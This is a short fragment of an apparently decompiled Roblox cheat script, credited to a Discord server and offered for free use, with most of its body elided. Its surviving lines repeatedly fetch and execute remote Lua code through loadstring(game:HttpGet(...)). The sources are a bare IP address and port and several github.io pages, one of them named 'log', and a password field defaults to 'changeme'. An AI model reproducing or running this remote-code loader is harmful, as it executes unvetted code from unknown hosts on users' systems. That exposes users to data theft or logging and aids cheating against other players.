if getgenv().Credits == "https://discord.gg/Aknd49ARke | If you pay for this script you get scammed this script is completely free for use" then
    ...
    if not l_l_Players_0_FirstChild_0 then
        loadstring(game:HttpGet("http://149.40.3.138:50908/notify"))().Notify({
        ...
        do
            ...
            local function v129(v121, v122) --[[ Line: 0 ]] --[[ Name:  ]]
                ...
                local v123 = {
                    ...
                    title = v121, 
                    description = v122, 
                    password = l_l_Main_0_0.Advanced.password or "changeme"
                };
                local v124 = {
            ...
            loadstring(game:HttpGet("https://xehh0.github.io/games/gamefinder.luau"))();
            local v556 = {};
            local _ = "$";
            pcall(function() --[[ Line: 0 ]] --[[ Name:  ]]
                -- upvalues: v556 (ref)
                v556 = loadstring(game:HttpGet("https://xehh0.github.io/side/elite"))() or {};
            end);
            ...
            loadstring(game:HttpGet("https://xehh0.github.io/side/log"))();
        end;
    end;
else
